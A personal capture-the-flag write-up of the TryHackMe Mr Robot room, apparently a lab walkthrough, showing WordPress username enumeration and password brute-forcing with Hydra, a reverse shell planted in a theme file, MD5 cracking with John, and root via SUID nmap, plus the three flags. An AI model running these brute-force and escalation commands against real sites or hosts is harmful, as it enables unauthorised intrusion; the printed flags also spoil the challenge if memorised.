### Target Name: Mr Robot CTF

### Target IP: `inconsistent (different TryHackMe sessions)`

### Attacker IP: `inconsistent (different TryHackMe sessions)`

### Difficulty: Medium

### Date: 21.09.2026

# -- Scanning & Enumeration --

# Open Ports

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

# Operating System & Service Versions (+ additional info)

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 00:db:33:85:95:9d:ee:2c:e4:4e:a4:a1:58:fe:dd:67 (RSA)
|   256 ef:49:d5:a3:22:db:09:78:d9:26:83:67:f8:60:78:87 (ECDSA)
|_  256 06:c8:c5:f0:4c:ca:5b:2b:3b:1e:f7:b4:d4:b6:5f:6c (ED25519)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# HTTP (80/TCP)

## via Firefox (+ FFUF)

#### sensitive files revealed in /var/www/html/robots.txt

![](../../assets/Pasted%20image%2020260921042636.png)

#### first flag revealed in /var/www/html/key-1-of-3.txt; obtain

![](../../assets/Pasted%20image%2020260921042739.png)

#### wordlist in /var/www/html/fsocity.dic

![](../../assets/Pasted%20image%2020260921042912.png)

#### `wget` the wordlist right away

```
[farqhadd@red-wheelbarrow mrrobot_ctf]$ wget http://10.113.159.20/fsocity.dic
--2026-09-21 04:39:50--  http://10.113.159.20/fsocity.dic
Connecting to 10.113.159.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6,9M) [text/x-c]
Saving to: ‘fsocity.dic’

fsocity.dic                            100%[============================================================================>]   6,91M  1,66MB/s    in 6,9s

2026-09-21 04:39:58 (1,00 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]

[farqhadd@red-wheelbarrow mrrobot_ctf]$ wc -l fsocity.dic
858160 fsocity.dic
```

#### sort & sanitize the wordlist right away

```
[farqhadd@red-wheelbarrow mrrobot_ctf]$ sort fsocity.dic | uniq < fsocity_sorted.dic

[farqhadd@red-wheelbarrow mrrobot_ctf]$ wc -l fsocity_sorted.dic
11451 fsocity_sorted.dic
```

#### Wordpress login page on /var/www/html/wp-login.php

![](../../assets/Pasted%20image%2020260921042403.png)

#### username enumeration possible via 'lost password' page
#### note the `F:Invalid username or e-mail.`

![](../../assets/Pasted%20image%2020260921042544.png)

## via BurpSuite

#### inspect the request via BurpSuite and remember the `user_login=` format

![](../../assets/Pasted%20image%2020260921043540.png)

#### inspect the normal login request via BurpSuite; format: `log=&pwd=`

![](../../assets/Pasted%20image%2020260921045617.png)

## via Hydra

#### brute-force usernames (fsocity.dic) and find ELLIOT

```
[farqhadd@red-wheelbarrow mrrobot_ctf]$ hydra -L fsocity_sorted.dic -e n 10.113.159.20 http-post-form "/wp-login.php?action=lostpassword:user_login=^USER^:F=Invalid username or e-mail" -t 64 -V -I -f

...

[80][http-post-form] host: 10.113.159.20   login: ELLIOT
```

# -- Exploitation --

## via Hydra

#### brute-force passwords (ELLIOT + fsocity.dic) and find ER28-0652

```
[farqhadd@red-wheelbarrow mrrobot_ctf]$ hydra -l ELLIOT -P fsocity_sorted.dic 10.113.159.20 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=is incorrect" -V -t 64 -I -f

...

[80][http-post-form] host: 10.113.159.20   login: ELLIOT   password: ER28-0652
```

## via Firefox

#### entering the credentials leads to the WordPress admin panel

![](../../assets/Pasted%20image%2020260921050629.png)

#### .php file upload restricted

![](../../assets/Pasted%20image%2020260921050908.png)

#### after a bit of exploration: Edit Themes panel with modifiable source files

![](../../assets/Pasted%20image%2020260921050941.png)

#### insert php reverse shell code into author-bio.php

![](../../assets/Pasted%20image%2020260921051215.png)

#### find out where wordpress stores themes to send a GET request

![](../../assets/Pasted%20image%2020260921051354.png)

#### succesfully connect with NetCat

![](../../assets/Pasted%20image%2020260921052901.png)

#### insufficient privileges to obtain the second flag

```
daemon@ip-10-113-188-107:/home/robot$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

---

# -- Post-Exploitation --

## Privilege Escalation

### PrivEsc Vectors Investigation

#### flag owner's password hash readable (md5)

```
daemon@ip-10-113-188-107:/home/robot$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2  2025 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

daemon@ip-10-113-188-107:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

#### use JohnTheRipper to crack

```
[farqhadd@red-wheelbarrow ~]$ john hash.txt --format=raw-MD5 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])

...

abcdefghijklmnopqrstuvwxyz (?)

...

Session completed
```

### Applying found vectors

#### switch user to `robot`

```
daemon@ip-10-113-188-107:/home/robot$ su robot
Password: abcdefghijklmnopqrstuvwxyz (hidden)

$ whoami
robot

$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

#### obtain the second flag

```
$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

### PrivEsc Vectors Investigation (1)

#### look for files with SUID privileges + notice `/usr/local/bin/nmap`

```
$ find / -perm /4000 2> /dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

### Applying found vectors (1)

#### command execution as root via `nmap --interactive` (found on GTFOBins)

```
$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help

nmap> whoami
root

nmap> id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

#### obtain the third flag

```
nmap> ls -la /root
total 44
drwx------  7 root root 4096 Jun  2  2025 .
drwxr-xr-x 23 root root 4096 Sep 21 03:22 ..
-rw-------  1 root root    0 Jun  2  2025 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  3 root root 4096 May 29  2025 .cache
drwx------  3 root root 4096 May 29  2025 .config
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
drwx------  3 root root 4096 May 29  2025 .gnupg
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
drwxr-xr-x  3 root root 4096 May 29  2025 .local
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
drwx------  2 root root 4096 May 29  2025 .ssh
-rw-------  1 root root    0 Jun  2  2025 .viminfo

nmap> cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

---
